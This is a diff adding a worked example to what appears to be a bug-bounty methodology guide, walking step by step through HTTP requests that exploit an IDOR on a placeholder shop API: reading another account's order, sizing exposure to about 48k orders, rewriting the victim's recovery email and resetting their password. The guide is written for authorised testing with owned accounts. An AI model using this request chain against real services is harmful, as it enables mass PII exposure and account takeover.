@@ -207,6 +207,58 @@ This is the phase that makes IDOR **un-false-positive-able**. Skipping it is why
 
 > **Why two equal-role accounts (not admin vs user):** equal roles isolate the *object*-level check. If you test as admin you can't tell whether access was granted by role (expected) or by missing object check (the bug). Use admin separately, for **BFLA** (§10).
 
+## 4.4 Worked example — a complete IDOR → account-takeover attack (full two-account transcript)
+
+> *In plain words:* the sections above tell you *what* each step is; this shows the *exact requests and responses*, in order, so you can recognise every stage on a real target. Read it as one continuous session with **two accounts you own** — A (attacker) and B (victim) — going from "confirm the missing check" all the way to "logged in as B." This is the arc every paid IDOR follows: **oracle → read → scale → write → ATO → stop.**
+
+**Target:** `https://shop.example.com` with a REST API. Two same-role accounts: **A** (`a-poc@inbox.test`, user id 7001) and **B** (`b-poc@inbox.test`, user id 8042). B has order **8001**. Goal: prove A can read *and* take over B — using only accounts we own.
+
+**STEP 1 — baseline the oracle (§4).** As **B**, open the order and capture the request + B's reference:
+```http
+GET /api/orders/8001 HTTP/1.1            →  HTTP/1.1 200 OK
+Host: shop.example.com                       {"id":8001,"owner":8042,"email":"b-poc@inbox.test",
+Authorization: Bearer <B_TOKEN>               "total":"$240.00","address":"12 Bramble Rd..."}
+```
+As **A**, do the *same* action on A's own order to learn the shape: `GET /api/orders/7001` → A's order. Now the test that defines IDOR — send **A's** credentials with **B's** reference:
+```http
+GET /api/orders/8001 HTTP/1.1            →  HTTP/1.1 200 OK        ← A's token, B's order id
+Host: shop.example.com                       {"id":8001,"owner":8042,"email":"b-poc@inbox.test",
+Authorization: Bearer <A_TOKEN>               "total":"$240.00","address":"12 Bramble Rd..."}
+```
+→ **A received B's order** (note `"owner":8042` ≠ A's 7001). The server trusted the reference and never checked ownership → **IDOR-READ confirmed.** (If A had gotten *A's own* order back, the server was session-scoping = safe; a 403/404 would send us to the §8 bypass toolbox.)
+
+**STEP 2 — size the impact without scraping (§6.5, §11.2).** The id is a **sequential integer**. Confirm the pattern with a *handful* of our own objects (7001, 7002 as A; 8001, 8002 as B) — each returns the matching owner's order — then read the population from server metadata instead of dumping real users:
+```http
+GET /api/orders?limit=1 HTTP/1.1         →  ... X-Total-Count: 48213     ← ~48k orders, all reachable by id-swap
+```
+→ This is the difference between Low and Critical: *"any order 1..48213 is readable by any authenticated user"* = **mass-PII**, stated from `X-Total-Count`, not from a scrape.
+
+**STEP 3 — look inside the object for auth material, then find the write verb (§11.3, §12).** B's profile object is also reachable. Try the **write** verb on it (copy the GET shape, change one field):
+```http
+PUT /api/users/8042 HTTP/1.1             →  HTTP/1.1 200 OK
+Host: shop.example.com                       {"id":8042,"email":"attacker+idor@inbox.test","updated":true}
+Authorization: Bearer <A_TOKEN>
+Content-Type: application/json
+
+{"email":"attacker+idor@inbox.test"}         ← A's token, changing B's recovery email
+```
+A `200` is **not** proof yet (§4.2) — re-read as **B** to confirm the change actually landed on B's object:
+```http
+GET /api/users/8042 HTTP/1.1             →  {"id":8042,"email":"attacker+idor@inbox.test", ...}
+Authorization: Bearer <B_TOKEN>              ← B's own token now shows the attacker email → the write stuck ⭐
+```
+
+**STEP 4 — the terminal impact: take over B (§12.1).** With B's recovery email pointed at our inbox, trigger the reset:
+```http
+POST /api/auth/forgot-password HTTP/1.1  →  202 Accepted  ("reset link sent")
+{"user":"b-poc@inbox.test"}                  → the reset link arrives at attacker+idor@inbox.test
+```
+Follow the link, set a new password, log in as **B**. → **Account takeover.** We went read-IDOR → write-IDOR → ATO through one missing ownership check.
+
+**STEP 5 — STOP and report (§19, §23, §25).** Everything used **our own** A and B accounts and benign markers; we **reverted** B's email afterward and never touched a real user. Report title: *"BOLA on `/api/orders/{id}` (mass-PII, ~48k enumerable) + write-IDOR on `PUT /api/users/{id}` → account takeover."* Lead with the **two-account proof** (A's token, B's object, B's data/change) and the highest impact (ATO + mass-PII scale). That transcript — A's credentials returning and changing B's data — **is** the finding; "I changed an id and saw data" with one account is not.
+
+> **Read the pattern, not just the bytes:** every paid IDOR is this shape — *two-account oracle → confirm A reaches B → size it from metadata (don't scrape) → find the write verb → drive to ATO/admin/cross-tenant → prove with your own accounts, revert, stop.* Swap the orders endpoint for a GraphQL `node(id:)` (§15), a nested child id (§8.10), or a tenant key (§16) and it's the same arc.
+
 ---
 
 # PART II — FINDING & BYPASS (work in this order)
